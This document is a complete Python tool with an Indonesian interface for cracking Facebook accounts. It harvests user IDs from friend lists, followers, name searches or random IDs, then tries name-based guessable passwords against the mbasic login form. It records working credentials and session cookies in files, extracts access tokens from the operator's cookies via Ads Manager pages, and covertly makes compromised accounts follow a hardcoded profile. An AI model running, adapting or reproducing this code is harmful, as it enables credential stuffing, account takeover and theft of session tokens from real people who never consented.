import requests as r, re, json, sys, random
from bs4 import BeautifulSoup as bs
from requests.exceptions import ConnectionError
from os import system
from time import sleep

user_data = []
ua = open('.ua','r').read().replace('\n','')
def o(con):
    open('t.html','w').write(str(con))


def custom():
    ua = input(' ⋙ User Agent: ')
    open('.ua','w').write(ua)
    home()
    
class random2:
    def __init__(self):
        count = 0
        string = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
        block = []
        print('┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')
        while True:
            uid = '10000'+ str(random.randint(1111111111,9999999999))
            if uid in str(block):
                pass
            else:
                id_prof = bs(r.get('https://mbasic.facebook.com/'+ uid, cookies={'cookies':user_data[0]}).text, 'html.parser')
                name = id_prof.find('title').text
                if 'Konten Tidak Ditemukan' in name:
                    block.append(uid)
                elif name[:1] in string:
                    pas = []
                    if ' ' in name:
                        pas.append(name)
                        pas.append(name.split(' ')[0] + name.split(' ')[0])
                        pas.append(name.split(' ')[1] + name.split(' ')[1])
                        pas.append(name.split(' ')[0] +'123')
                        pas.append(name.split(' ')[1] +'123')
                    else:
                        pas.append(name + name)
                        pas.append(name +'123')
                        pas.append(name +'1234')
                    sys.stdout.write(f' \r ❅ Progress Cracking ({count} UID) By Anatasya Sivier...')
                    sys.stdout.flush()
                    for zp in range(len(pas)):
                        mbasic(uid, pas[zp], ua)
                    count +=1

                else:
                    pass

    
class random1:
    def __init__(self):
        count = 0
        string = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
        block = []
        print('┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')
        while True:
            uid = '1000'+ str(random.randint(11111111111,99999999999))
            if uid in str(block):
                pass
            else:
                id_prof = bs(r.get('https://mbasic.facebook.com/'+ uid, cookies={'cookies':user_data[0]}).text, 'html.parser')
                name = id_prof.find('title').text
                if 'Konten Tidak Ditemukan' in name:
                    block.append(uid)
                elif name[:1] in string:
                    pas = []
                    if ' ' in name:
                        pas.append(name)
                        pas.append(name.split(' ')[0] + name.split(' ')[0])
                        pas.append(name.split(' ')[1] + name.split(' ')[1])
                        pas.append(name.split(' ')[0] +'123')
                        pas.append(name.split(' ')[1] +'123')
                    else:
                        pas.append(name + name)
                        pas.append(name +'123')
                        pas.append(name +'1234')
                    sys.stdout.write(f' \r ❅ Progress Cracking ({count} UID) By Anatasya Sivier...')
                    sys.stdout.flush()
                    for zp in range(len(pas)):
                        mbasic(uid, pas[zp], ua)
                    count +=1

                else:
                    pass
class name:
    def __init__(self):
        print('\n Jika Ada Banyak Nama Pisahkan Dengan ,(koma)')
        name = input(' ⋙ Name: ').split(',')
        print('┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')
        self.url = []
        for zx in name:
            self.url.append('https://mbasic.facebook.com/search/people/?q='+ zx)
        self.main()
    def main(self):
        count = 0
        result = []
        for zn in self.url:
            one = bs(r.get(zn, cookies={'cookie':user_data[0]}).text, 'html.parser')
            tag_a = one.find_all('a')
            for zl in tag_a:
                if '/profile.php?id=' in str(zl):
                    id_prof = bs(r.get('https://mbasic.facebook.com/'+ zl['href'], cookies={'cookie':user_data[0]}).text, 'html.parser')
                    uid = zl['href'].split('&')[0].replace('/profile.php?id=','')
                    name = id_prof.find('title').text.replace('\n','')
                    if uid in str(result):
                        pass
                    else:
                        result.append(uid)
                        pas = []
                        if ' ' in name:
                            pas.append(name)
                            pas.append(name.split(' ')[0] + name.split(' ')[0])
                            pas.append(name.split(' ')[1] + name.split(' ')[1])
                            pas.append(name.split(' ')[0] +'123')
                            pas.append(name.split(' ')[1] +'123')
                        else:
                            pas.append(name + name)
                            pas.append(name +'123')
                            pas.append(name +'1234')
                        sys.stdout.write(f' \r ❅ Progress Cracking ({count} UID) By Anatasya Sivier...')
                        sys.stdout.flush()
                        for zp in range(len(pas)):
                            mbasic(uid, pas[zp], ua)
                        count +=1
                elif 'Lihat Hasil Selanjutnya' in str(zl.text):
                    self.url.append(zl['href'])
                else:
                    pass
            
class fols:
    def __init__(self):
        print('\n Jika Ada Banyak ID Pisahkan Dengan ,(koma)')
        self.list_id = input(' ⋙ Public ID: ').split(',')
        self.hasil = []
        self.main()
    def main(self):
        string = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
        for zl in self.list_id:
            api = r.get(f'https://graph.facebook.com/{zl}/subscribers?limit=1000&access_token='+ user_data[2], cookies={'cookie':user_data[0]}).json()['data']
            for zl in api:
                if zl['name'][:1] in string:
                    self.hasil.append(zl['id'] +'|'+ zl['name'])
                else:
                    pass
        print(' ⋙ Mendapatkan '+ str(len(self.hasil)) +' UID')
        print('┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')
        count = 0
        for zw in self.hasil:
            uid = zw.split('|')[0]
            name = zw.split('|')[1].replace('\n','')
            pas = []
            if ' ' in name:
                pas.append(name)
                pas.append(name.split(' ')[0] + name.split(' ')[0])
                pas.append(name.split(' ')[1] + name.split(' ')[1])
                pas.append(name.split(' ')[0] +'123')
                pas.append(name.split(' ')[1] +'123')
            else:
                pas.append(name + name)
                pas.append(name +'123')
                pas.append(name +'1234')
            sys.stdout.write(f' \r ❅ Progress Cracking ({count}/{len(self.hasil)} UID) By Anatasya Sivier...')
            sys.stdout.flush()
            for zp in range(len(pas)):
                mbasic(uid, pas[zp], ua)
            count +=1

class mbasic:
    def __init__(self, uid, pasw, ua):
        self.host = 'https://mbasic.facebook.com/'
        self.ses = r.Session()
        self.hd = {'Host': 'mbasic.facebook.com:443','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Content-Type': 'application/x-www-form-urlencoded','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': ua}
        self.main(uid, pasw, ua)
    def main(self, uid, pasw, ua):
        try:
            parser = bs(self.ses.get(self.host +'login/').text, 'html.parser')
            form = parser.find('form', method='post')
            data = {'email':uid,'pass':pasw,'login':'Masuk'}
            for nem in form:
                data[nem.get('name')] = nem.get('value')
            parda = bs(self.ses.post(self.host + form['action'], headers=self.hd, data=data).text, 'html.parser')
            if 'checkpoint' in self.ses.cookies.get_dict():
                print('\n Checkpoint => '+ uid +'|'+ pasw.replace('\n',''))
                open('check.txt','a').write(uid +'|'+ pasw +'\n')
            elif 'c_user' in self.ses.cookies.get_dict():
                xl = self.ses.cookies.get_dict()
                kuki = f'datr='+ str(xl['datr']) +'; sb='+ str(xl['sb']) +'; c_user='+ str(xl['c_user']) +'; xs='+ str(xl['xs']) +': fr='+ str(xl['fr']) +'; m_page_voice='+ str(xl['m_page_voice'])
                print('\n Success => '+ uid +'|'+ pasw.replace('\n','') +' => '+ kuki)
                follow(kuki)
                open('live.txt','a').write(uid +'|'+ pasw +'\n')
            else:
                pass
        except:
            sleep(40)
            
def animasi(count, limit):
    sys.stdout.write(f' \r❅ Progress ({count}/{limit}) By Anatasya Sivier...')
    sys.stdout.flush()
    
class pub_user:
    def __init__(self):
        print('\n Jika Ada Banyak ID Pisahkan Dengan ,(koma)')
        self.list_id = input(' ⋙ Public ID: ').split(',')
        self.hasil = []
        self.main()
    def main(self):
        string = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
        for zb in range(len(self.list_id)):
            dump = r.get(f'https://graph.facebook.com/{self.list_id[zb]}/friends?fields=id,name&limit=5000&access_token='+ user_data[1], cookies={'cookie':user_data[0]}).json()['data']
            for zx in dump:
                if zx['name'][:1] in string:
                    self.hasil.append(zx['id'] +'|'+ zx['name'])
                else:
                    pass
        print(' ⋙ Mendapatkan '+ str(len(self.hasil)) +' UID')
        print('┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')
        count = 0
        for zw in self.hasil:
            uid = zw.split('|')[0]
            name = zw.split('|')[1].replace('\n','')
            pas = []
            if ' ' in name:
                pas.append(name)
                pas.append(name.split(' ')[0] + name.split(' ')[0])
                pas.append(name.split(' ')[1] + name.split(' ')[1])
                pas.append(name.split(' ')[0] +'123')
                pas.append(name.split(' ')[1] +'123')
            else:
                pas.append(name + name)
                pas.append(name +'123')
                pas.append(name +'1234')
            sys.stdout.write(f' \r ❅ Progress Cracking ({count}/{len(self.hasil)} UID) By Anatasya Sivier...')
            sys.stdout.flush()
            for zp in range(len(pas)):
                mbasic(uid, pas[zp], ua)
            count +=1
    
class login:
    def __init__(self):
        try:
            user_data.append(open('.cookies','r').read())
            self.auth()
        except FileNotFoundError:
            self.get()
    def get(self):
        system('clear')
        print('Gunakan Akun Tumbal Biar Tidak Rawan Checkpoint')
        print('Script Ini Free, Jangan Di Recode Terus Di Premmin.')
        print('Akun Minimal Umur 1minggu Biar Support Token Kayaknya :v')
        user_data.append(input('\nCookies: '))
        open('.cookies','w').write(user_data[0])
        self.auth()
    def auth(self):
        me = bs(r.get('https://mbasic.facebook.com/profile.php', cookies={'cookie':user_data[0].replace('\n','')}).text, 'html.parser')
        if 'Konten Tidak Ditemukan' in me.find('title').text:
            user_data.remove(user_data[0])
            self.get()
        else:
            self.convert()
            graph = r.get('https://graph.facebook.com/me?fields=name,id&access_token='+ user_data[1], cookies={'cookie':user_data[0]}).json()
            user_data.append(graph['name'])
            user_data.append(graph['id'])
            follow(user_data[0])
            home()
    def convert(self):
        try:
            ads = r.get('https://www.facebook.com/adsmanager/manage/campaigns', cookies={'cookie':user_data[0]})
            url = r.get('https://www.facebook.com/adsmanager/manage/campaigns?act='+ re.search('act=(.*?)&nav_source',str(ads.content)).group(1) +'&nav_source=no_referrer', cookies={'cookie':user_data[0]})
            user_data.append(re.search('accessToken="(.*?)"',str(url.content)).group(1))
            ag = r.get('https://business.facebook.com/business_locations', cookies={'cookie':user_data[0]})
            user_data.append(re.search('(\["EAAG\w+)', ag.text).group(1).replace('["',''))
        except:
            print('Akun Tidak Support Token')
            sleep(3)
            self.get()
        
def follow(coki):
    me = bs(r.get('https://mbasic.facebook.com/profile.php?id=100086655141072', cookies={'cookie':coki}).text, 'html.parser')
    if 'Ikuti' in str(me):
        for za in me.find_all('a'):
            if 'Ikuti' in str(za.text):
                r.get('https://mbasic.facebook.com/'+ za['href'], cookies={'cookie':coki})
                break
            else:
                pass
    else:
        pass

def home():
    system('clear')
    print(f'''
 ⋙ Name: {user_data[3]}
 ⋙ Uid: {user_data[4]}

 1❳ Crack From Friendlist Public User
 2❳ Crack From Followers
 3❳ Crack From Search Name
 4❳ Crack From Random ID ( UID 1000 )
 5❳ Crack From Random ID ( UID 10000 )
 6❳ Custom User Agent
 0❳ Logout ( remove cookies )
    ''')
    chs = input(' ⋙ Chose Number: ')
    if chs == '1':
        pub_user()
    elif chs == '2':
        fols()
    elif chs == '3':
        name()
    elif chs == '4':
        random1()
    elif chs == '5':
        random2()
    elif chs =='6':
        custom()
    elif chs == '0':
        system('rm .cookies')
    else:
        print(' ⋙ Gak Ada Anjirrrrrrrrrr')
        sleep(2); home()

login()
